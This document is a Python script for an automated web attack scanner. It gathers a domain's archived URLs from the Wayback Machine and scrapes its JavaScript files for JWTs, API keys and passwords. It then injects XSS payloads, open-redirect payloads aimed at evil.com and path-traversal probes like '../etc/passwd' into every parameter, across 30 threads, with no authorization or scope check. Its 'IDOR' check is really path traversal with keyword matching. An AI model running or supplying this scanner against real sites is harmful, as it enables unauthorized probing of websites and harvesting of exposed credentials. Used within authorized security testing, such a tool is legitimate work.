import requests, re, threading
from urllib.parse import urlparse, urljoin, parse_qs
from queue import Queue
from bs4 import BeautifulSoup
from tqdm import tqdm

# Patterns for sensitive info in JS or URLs
SENSITIVE_PATTERNS = {
    "JWT Token": r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
    "API Key": r"(?i)(api[_-]?key|token|secret|access[_-]?token|auth[_-]?token)[\"'=:\s]+([a-z0-9-_]{16,})",
    "Password": r"(?i)password[\"'=:\s]+([^\s&\"']+)",
    # Add more as needed
}

# Patterns for vulnerabilities
OPEN_REDIRECT_PAYLOADS = ["http://evil.com", "https://evil.com", "//evil.com"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
IDOR_PAYLOADS = ["../etc/passwd", "/admin", "/secret"]

# Thread-safe results store
results_lock = threading.Lock()
results = []

def fetch_wayback_urls(domain):
    urls = set()
    try:
        # Query Wayback Machine API (archive.org)
        api_url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey&limit=5000"
        r = requests.get(api_url, timeout=15)
        data = r.json()
        for entry in data[1:]:  # skip header row
            url = entry[0]
            urls.add(url)
    except Exception as e:
        print(f"[!] Wayback fetch error: {e}")
    return list(urls)

def scrape_js_urls(url):
    """Fetch URL, parse HTML, find JS files, return JS URLs."""
    js_urls = set()
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            # Find all <script src="">
            for script in soup.find_all("script", src=True):
                src = script['src']
                full_url = urljoin(url, src)
                js_urls.add(full_url)
    except:
        pass
    return list(js_urls)

def extract_sensitive_from_js(js_url):
    """Download JS and scan for sensitive patterns."""
    findings = []
    try:
        r = requests.get(js_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code == 200:
            text = r.text
            for name, pattern in SENSITIVE_PATTERNS.items():
                for m in re.finditer(pattern, text):
                    val = m.group(0)
                    findings.append((name, val, js_url))
    except:
        pass
    return findings

def check_open_redirect(url):
    """Test URL params for open redirect."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    for param in params:
        for payload in OPEN_REDIRECT_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            # Rebuild test URL
            query_string = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
            try:
                r = requests.get(test_url, allow_redirects=False, timeout=10)
                if r.is_redirect or r.status_code in [301,302,303,307,308]:
                    location = r.headers.get("Location", "")
                    if payload in location:
                        findings.append(("Open Redirect", test_url))
            except:
                pass
    return findings

def check_xss(url):
    """Test URL params for reflected XSS."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            query_string = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
            try:
                r = requests.get(test_url, timeout=10)
                if payload in r.text:
                    findings.append(("XSS", test_url))
            except:
                pass
    return findings

def check_idor(url):
    """Try IDOR payloads in URL path or params."""
    findings = []
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path
    params = parse_qs(parsed.query)
    # Check path manipulation
    for payload in IDOR_PAYLOADS:
        test_url = base_url + payload
        try:
            r = requests.get(test_url, timeout=10)
            # Heuristic: HTTP 200 + some sensitive keywords
            if r.status_code == 200 and ("password" in r.text.lower() or "secret" in r.text.lower() or "admin" in r.text.lower()):
                findings.append(("IDOR", test_url))
        except:
            pass
    # Also try param injection
    for param in params:
        for payload in IDOR_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            query_string = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
            test_url = f"{base_url}{path}?{query_string}"
            try:
                r = requests.get(test_url, timeout=10)
                if r.status_code == 200 and ("password" in r.text.lower() or "secret" in r.text.lower()):
                    findings.append(("IDOR", test_url))
            except:
                pass
    return findings

def find_jwt_in_url(url):
    """Detect JWT tokens in URL parameters."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    for param in params:
        for val in params[param]:
            if val.startswith("eyJ"):  # typical JWT header start
                findings.append(("JWT Token", url))
    return findings

def worker(queue):
    while True:
        url = queue.get()
        if url is None:
            break
        local_findings = []

        # Check open redirect
        local_findings.extend(check_open_redirect(url))

        # Check XSS
        local_findings.extend(check_xss(url))

        # Check IDOR
        local_findings.extend(check_idor(url))

        # Find JWT tokens in URL
        local_findings.extend(find_jwt_in_url(url))

        with results_lock:
            for item in local_findings:
                results.append(item)
        queue.task_done()

def main():
    inp = input("Enter comma-separated URLs or a filename: ").strip()

    # Determine if input is a file
    try:
        with open(inp, "r") as f:
            input_urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        # Not a file, treat as comma-separated input
        input_urls = [u.strip() for u in inp.split(",") if u.strip()]

    # Normalize URLs, if domain only add https://
    normalized_urls = []
    for u in input_urls:
        if not u.startswith("http://") and not u.startswith("https://"):
            u = "https://" + u
        normalized_urls.append(u)

    # Collect URLs from Wayback for all domains
    all_urls = []
    for u in normalized_urls:
        domain = urlparse(u).netloc
        print(f"[*] Fetching archived URLs from Wayback for domain: {domain}")
        wayback_urls = fetch_wayback_urls(domain)
        print(f"  Found {len(wayback_urls)} URLs from Wayback")
        all_urls.extend(wayback_urls)

        # Also add the original URL itself for scanning
        all_urls.append(u)

        # Scrape JS files from the original URL to find more URLs and sensitive info
        js_urls = scrape_js_urls(u)
        print(f"  Found {len(js_urls)} JS files to scan for sensitive info")
        for js_url in js_urls:
            js_findings = extract_sensitive_from_js(js_url)
            with results_lock:
                for name, val, jsurl in js_findings:
                    results.append((f"Sensitive Info - {name}", val, jsurl))

    # Remove duplicates
    all_urls = list(set(all_urls))
    print(f"[*] Starting scan on {len(all_urls)} URLs with 30 threads...")

    # Start worker threads
    queue = Queue()
    threads = []
    for _ in range(30):
        t = threading.Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()
        threads.append(t)

    for url in all_urls:
        queue.put(url)

    queue.join()

    # Stop workers
    for _ in range(30):
        queue.put(None)
    for t in threads:
        t.join()

    # Print results
    print("\nScan Complete. Results:")
    if results:
        for r in results:
            if len(r) == 3:
                print(f"[!] {r[0]}: {r[1]} ({r[2]})")
            else:
                print(f"[!] {r[0]}: {r[1]}")
    else:
        print("No issues found.")

if __name__ == "__main__":
    main()
